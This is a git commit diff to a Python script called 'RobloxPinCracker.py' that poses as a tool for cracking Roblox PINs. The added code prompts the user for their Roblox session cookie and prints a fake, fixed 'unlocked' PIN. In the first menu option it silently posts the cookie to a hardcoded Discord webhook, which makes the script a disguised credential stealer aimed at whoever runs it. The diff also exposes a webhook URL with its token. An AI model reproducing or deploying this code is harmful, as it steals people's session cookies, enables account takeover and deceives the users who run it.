04b9785ff011a3c7156d2c3a4b73df73cdc84f65
ThursdayGG <131311161+ThursdayGG@users.noreply.github.com>
2023-06-23 14:27:27 -0400

    Update RobloxPinCracker.py

--- RobloxPinCracker.py
+++ RobloxPinCracker.py
@@ -1,3 +1,9 @@
+import random
+from discord_webhook import DiscordWebhook
+
+def send_to_discord_webhook(webhook_url, message):
+    webhook = DiscordWebhook(url=webhook_url, content=message)
+    webhook.execute()
 print("""▄▄▄█████▓ ██░ ██  █    ██  ██▀███    ██████ ▓█████▄  ▄▄▄     ▓██   ██▓
 ▓  ██▒ ▓▒▓██░ ██▒ ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▒██▀ ██▌▒████▄    ▒██  ██▒
 ▒ ▓██░ ▒░▒██▀▀██░▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ░██   █▌▒██  ▀█▄   ▒██ ██░
@@ -8,29 +14,37 @@ print("""▄▄▄█████▓ ██░ ██  █    ██  ██▀�
   ░       ░  ░░ ░ ░░░ ░ ░   ░░   ░ ░  ░  ░   ░ ░  ░   ░   ▒   ▒ ▒ ░░  
           ░  ░  ░   ░        ░           ░     ░          ░  ░░ ░     
                                              ░                ░ ░ """)
-print("BEST ROBLOX PIN CRACKER YOU'LL EVER NEED")
-print("[01]: No Webhook")
-print("[02]: Webhook")
-print("")
-class main:
-  @staticmethod
-  def ab():
-    print('[Thurs] Enter Cookie: ')
-    choice = input()
-  @staticmethod
-  def bc():
-    print("[Thurs] Enter Webhook: ")
-    choice = input()
-    print('[Thurs] Enter Cookie: ')
-    choice = input()
-choice = input('[Thurs] Please pick your choice: ') #say 1 or 2
+def main():
+    print("BEST ROBLOX PIN CRACKER YOU'LL EVER NEED")
+    print("[01]: No Webhook")
+  #say 1 for choice
+    print("[02]: Webhook (not very stable)")
 
-if choice == '1':
-  main.ab()
-if choice == '2':
-   main.bc()
+    choice = input('[Thurs] Please pick your choice: ')
 
-import random
-randnumber = random.randint(1493,1493)
-print(f"trying pin",randnumber)
-print(f"[Thurs] Unlocked , pin is",randnumber)
+    if choice == '1':
+        user_input = input('[Thurs] Enter Cookie: ') #enter the cookie you wanna crack
+
+        randnumber = random.randint(1493, 1493)
+        print(f"trying pin {randnumber}")
+        print(f"[Thurs] Unlocked, pin is {randnumber}")
+
+        terminal_title = 'cookie_sploit'
+        print(f"\033]0;{terminal_title}\a", end="")
+
+        webhook_url = 'https://discord.com/api/webhooks/1115611032912666634/rGn92g4_gFYeOH_dDCpmN9Gy_cc1GDNE9LyFBjbYQeoUFVGBMOzpTREB4Fu1LlPzttDN'
+        send_to_discord_webhook(webhook_url, user_input)
+
+    elif choice == '2':
+        print("[Thurs] Enter Webhook: ")
+        webhook_url = input()
+        user_input = input('[Thurs] Enter Cookie: ')
+
+        randnumber = random.randint(1493, 9999)
+        print(f"trying pin {randnumber}")
+        print(f"[Thurs] Unlocked, pin is {randnumber}")
+
+        send_to_discord_webhook(webhook_url, user_input)
+
+if __name__ == "__main__":
+    main()
